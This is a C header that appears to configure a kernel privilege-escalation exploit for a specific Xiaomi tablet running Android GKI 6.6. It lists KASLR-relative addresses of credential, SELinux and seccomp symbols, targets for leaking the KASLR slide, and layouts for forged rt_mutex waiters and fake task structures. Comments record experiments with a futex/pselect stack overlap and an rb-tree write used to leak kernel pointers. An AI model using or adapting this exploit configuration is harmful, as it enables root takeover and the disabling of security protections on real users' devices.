#ifndef TARGET_H
#define TARGET_H

/*
 * Xiaomi Pad 7S Pro ("violin") - GKI 6.6.77-android15-8
 * Kernel build: abogki443185593-4k
 *
 * Device: Xiaomi Pad 7S Pro (25053RP5CC / violin)
 * Firmware: BP2A.250605.031.A3 / HyperOS OS3.0.303.0.WOTCNXM
 * Compiler: Android clang 18.0.0 (r510928)
 * KASLR: Enabled (slide leaked at runtime)
 *
 * Symbol offsets derived from /proc/kallsyms on device (2026-07-10).
 * KIMAGE_TEXT_BASE = compile-time kernel image base.
 * IMPORTANT: offsets below are image-relative offsets with the observed KASLR slide removed.
 * Runtime symbol address = leaked_kaslr_base + offset.
 */

#define BUILD_VARIANT_LABEL "violin_gki_6.6.77"
#define BUILD_FINGERPRINT "Xiaomi/violin/violin:16/BP2A.250605.031.A3/OS3.0.303.0.WOTCNXM:user/release-keys"

/* Memory layout - ARM64 39-bit VA.\n * /proc/iomem on rooted same-model device shows _text physical load at 0x00210000.\n */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x0ULL
#define P0_KERNEL_PHYS_LOAD 0x00210000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Exact stack-frame match from the shipped violin kernel binary:
 * futex waiter base: syscall_sp - 0x70 - 0x60 - 0x1c0 + 0x90 = sp - 0x200
 * pselect fdset base: syscall_sp - 0x90 - 0x1f0 + 0x80 = sp - 0x200
 * Therefore no qword shift is required. A shift of 1 corrupts every forged
 * waiter field by eight bytes and panics in rt_mutex_adjust_prio_chain(). */
#define PSELECT_WAITER_WORD_SHIFT 0

/*
 * Slide semantics experiment knobs.
 *
 * E1 (2026-07-11): VIOLIN_SLIDE_RED_TREE_PC=1 — set RB_RED on tree_entry
 *   __rb_parent_color to test whether rb_insert_color rebalancing is the
 *   missing trigger. PI parent kept BLACK; single variable change from stable0.
 *
 * stable0 evidence:
 * - sched_setattr, pselect, and full slide route pass without reboot
 * - but boot_id reads UUID (no kernel pointer leak), suggesting rb-tree
 *   insertion did not trigger the write to sysctl_bootid.
 */
#define VIOLIN_SLIDE_USE_FAKE_TASK 0
#define VIOLIN_SLIDE_FAKE_TASK_GROUP_ZERO 0
#define VIOLIN_SLIDE_PI_TOP_TASK_FAKE 0
#define VIOLIN_SLIDE_RED_TREE_PC 0
#define VIOLIN_SLIDE_RED_PI_PARENT 0

/* Kernel symbol offsets (KASLR-invariant, from kallsyms 2026-07-10) */
#define ASHMEM_MISC_OFF              0x000000000223b5d8ULL  /* symbol: ashmem_misc (miscdevice struct) */
#define ASHMEM_MISC_FOPS_OFF         0x0000000001269710ULL  /* symbol: misc_fops */
#define ASHMEM_FOPS_OFF              0x00000000012c9df0ULL  /* symbol: ashmem_fops */
#define ASHMEM_IOCTL_OFF             0x0000000000c7a62cULL  /* symbol: ashmem_ioctl */
#define ASHMEM_COMPAT_IOCTL_OFF      0x0000000000c7ace8ULL  /* symbol: compat_ashmem_ioctl */
#define ASHMEM_MMAP_OFF              0x0000000000c7ad3cULL  /* symbol: ashmem_mmap */
#define ASHMEM_OPEN_OFF              0x0000000000c7af5cULL  /* symbol: ashmem_open */
#define ASHMEM_RELEASE_OFF           0x0000000000c7afe4ULL  /* symbol: ashmem_release */
#define ASHMEM_SHOW_FDINFO_OFF       0x0000000000c7b070ULL  /* symbol: ashmem_show_fdinfo */
#define CONFIGFS_READ_ITER_OFF       0x0000000000488978ULL  /* symbol: configfs_read_iter */
#define CONFIGFS_BIN_WRITE_ITER_OFF  0x0000000000488ea4ULL  /* symbol: configfs_bin_write_iter */
#define COPY_SPLICE_READ_OFF         0x000000000040d4acULL  /* symbol: copy_splice_read */
#define NOOP_LLSEEK_OFF              0x00000000003c0380ULL  /* symbol: noop_llseek */
#define INIT_TASK_OFF                0x00000000020de280ULL  /* symbol: init_task */
#define INIT_CRED_OFF                0x00000000020f0548ULL  /* symbol: init_cred */
#define FAIR_SCHED_CLASS_OFF         0x000000000164e1a8ULL  /* symbol: fair_sched_class */
#define INIT_UTS_NS_OFF              0x0000000002262210ULL  /* symbol: init_uts_ns */
#define EMPTY_ZERO_PAGE_OFF          0x00000000022cc000ULL  /* symbol: empty_zero_page */
#define ROOT_TASK_GROUP_OFF          0x00000000022d4580ULL  /* symbol: root_task_group */
#define SELINUX_BLOB_SIZES_OFF       0x000000000164fb48ULL  /* symbol: selinux_blob_sizes */
#define SELINUX_ENFORCING_OFF        0x000000000207cae0ULL  /* symbol: selinux_enforcing_boot */
#define SECURITY_HOOK_HEADS_OFF      0x000000000164f410ULL  /* symbol: security_hook_heads */
#define KMALLOC_CACHES_OFF           0x000000000164ef50ULL  /* symbol: kmalloc_caches */
#define ANON_PIPE_BUF_OPS_OFF        0x000000000114a288ULL  /* symbol: anon_pipe_buf_ops */

#define ASHMEM_MISC (KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF)
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define FAIR_SCHED_CLASS (KIMAGE_TEXT_BASE + FAIR_SCHED_CLASS_OFF)
#define INIT_CRED_P0 P0_DATA_ALIAS_CONST(INIT_CRED)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* KASLR slide leak targets (from kallsyms 2026-07-10) */
#define SLIDE_NFULNL_LOGGER_OFF      0x00000000020d2270ULL  /* symbol: nfulnl_logger */
#define SLIDE_LOGGERS_0_1_OFF        0x00000000020d21b8ULL  /* symbol: loggers */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0000000002336f58ULL  /* sysctl_bootid is the UUID data buffer; rb_erase writes __rb_parent_color here */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
/* Historical compatibility name only.  `sysctl_bootid` is the boot-ID data
 * buffer, not the random_table ctl_table entry; it is intentionally the same
 * address as SLIDE_RANDOM_BOOT_ID_DATA_OFF. */
#define SLIDE_SYSCTL_BOOTID_OFF      0x0000000002336f58ULL  /* symbol: sysctl_bootid ctl_table */

#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Page payload layout - fixed values (same across all targets) */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* Waiter struct offsets - GKI 6.6 rt_mutex_waiter layout (from kheaders)
 * rt_waiter_node tree    @ 0x00 (entry=rb_node 0x18, prio=0x18, deadline=0x20)
 * rt_waiter_node pi_tree @ 0x28 (entry=rb_node 0x18, prio=0x40, deadline=0x48)
 * task_struct*           @ 0x50
 * rt_mutex_base*         @ 0x58
 * unsigned int wake_state@ 0x60
 * ww_acquire_ctx*        @ 0x68 */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x28
#define WAITER_TASK_OFF 0x50
#define WAITER_LOCK_OFF 0x58
#define WAITER_WAKE_STATE_OFF 0x60
#define WAITER_PRIO_OFF 0x18
#define WAITER_DEADLINE_OFF 0x20
#define WAITER_WW_CTX_OFF 0x68

/* Fake waiter struct offsets - fixed */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* Fake task struct offsets - GKI 6.6 specific */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
/* Fake task struct offsets.
 * Verified from the OS3.0.303.0.WOTCNXM full OTA kheaders:
 *   task_struct.pi_lock       = 0x90c
 *   task_struct.pi_waiters    = 0x920
 *   task_struct.pi_top_task   = 0x930
 *   task_struct.pi_blocked_on = 0x938
 *
 * Older slide experiments used the caiman-compatible 0x924/0x938/0x948/0x950
 * layout; full OTA kheaders now show that is wrong for violin and shifts the
 * rt_mutex fields by +0x18.
 */
#define MAIN_FAKE_TASK_PI_LOCK_OFF 0x90c
#define MAIN_FAKE_TASK_PI_WAITERS_OFF 0x920
#define MAIN_FAKE_TASK_PI_TOP_TASK_OFF 0x930
#define MAIN_FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

#define SLIDE_FAKE_TASK_PI_LOCK_OFF MAIN_FAKE_TASK_PI_LOCK_OFF
#define SLIDE_FAKE_TASK_PI_WAITERS_OFF MAIN_FAKE_TASK_PI_WAITERS_OFF
#define SLIDE_FAKE_TASK_PI_TOP_TASK_OFF MAIN_FAKE_TASK_PI_TOP_TASK_OFF
#define SLIDE_FAKE_TASK_PI_BLOCKED_ON_OFF MAIN_FAKE_TASK_PI_BLOCKED_ON_OFF

#define FAKE_TASK_PI_LOCK_OFF SLIDE_FAKE_TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_WAITERS_OFF SLIDE_FAKE_TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF SLIDE_FAKE_TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF SLIDE_FAKE_TASK_PI_BLOCKED_ON_OFF

/* ConfigFS offsets - fixed */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* mm_struct offset */
#define MM_OWNER_OFF 1032

/* task_struct field offsets - from GKI 6.6 headers (same across all targets) */
#define TASK_PID_OFF 0x618
#define TASK_TGID_OFF 0x61c
#define TASK_REAL_PARENT_OFF 0x628
#define TASK_ATOMIC_FLAGS_OFF 0x5d8
#define TASK_REAL_CRED_OFF 0x818
#define TASK_CRED_OFF 0x820
#define TASK_COMM_OFF 0x830
#define TASK_TASKS_OFF 0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8e8

/* cred struct field offsets */
#define CRED_UID_OFF 8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF 48
#define CRED_SECURITY_OFF 128

/* SELinux cred offsets - fixed */
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

/* Seccomp offsets - fixed */
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

/* struct page - GKI 6.6 with 4K pages */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

/* pipe_buffer - fixed */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* pipe_inode_info field offsets - GKI 6.6 (from caiman) */
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
#define PIPE_INODE_INFO_SIZE 0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64
#define PIPE_MAX_USAGE_OFF 0x68
#define PIPE_RING_SIZE_OFF 0x6c
#define PIPE_NR_ACCOUNTED_OFF 0x70
#define PIPE_READERS_OFF 0x74
#define PIPE_WRITERS_OFF 0x78
#define PIPE_FILES_OFF 0x7c
#define PIPE_TMP_PAGE_OFF 0x90
#define PIPE_BUFS_OFF 0xa8
#define PIPE_USER_OFF 0xb0

/* file_operations field offsets - GKI 6.6 */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xb8
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
